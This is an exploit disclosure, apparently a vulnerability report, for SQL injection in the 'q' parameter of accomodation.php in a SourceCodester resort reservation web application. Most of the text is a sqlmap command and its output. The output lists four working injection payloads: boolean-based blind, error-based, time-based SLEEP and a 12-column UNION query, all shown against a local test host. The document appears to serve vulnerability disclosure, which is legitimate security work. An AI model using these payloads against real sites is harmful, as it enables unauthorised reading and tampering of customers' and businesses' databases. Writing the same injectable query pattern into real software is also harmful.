### Resort Reservation System - SQLi

### Date: 2026-02-27
### Exploit Author: xiahao@webray.com.cn
### Vendor Homepage: https://www.sourcecodester.com
### Software Link: https://www.sourcecodester.com/php/12707/resort-reservation-system-paypalcredit-carddebit-card-payment.html
### Tested on: MacOs13.5 + phpstudy

# /accomodation.php（SQLI）

### Sample request POC #1

```
sqlmap -u "http://localhost:8889/TubiganGarden/?p=accomodation&q=*" --batch


Parameter: #1* (URI)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: http://localhost:8889/TubiganGarden/?p=accomodation&q=-4277' OR 6081=6081#

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: http://localhost:8889/TubiganGarden/?p=accomodation&q=' AND GTID_SUBSET(CONCAT(0x71716b6a71,(SELECT (ELT(9645=9645,1))),0x716a717171),9645)-- tFlc

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://localhost:8889/TubiganGarden/?p=accomodation&q=' AND (SELECT 8676 FROM (SELECT(SLEEP(5)))JKdt)-- FlGZ

    Type: UNION query
    Title: MySQL UNION query (NULL) - 12 columns
    Payload: http://localhost:8889/TubiganGarden/?p=accomodation&q=' UNION ALL SELECT CONCAT(0x71716b6a71,0x45445143704a78717651457368514f42506e47624d4e45417a575265744c66556d686a6c4c656277,0x716a717171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
```

![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/20260227-144841.png "Resort Reservation System")

### Vulnerability code
accomodation.php:50
![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/20260227-144930.png "Resort Reservation System")
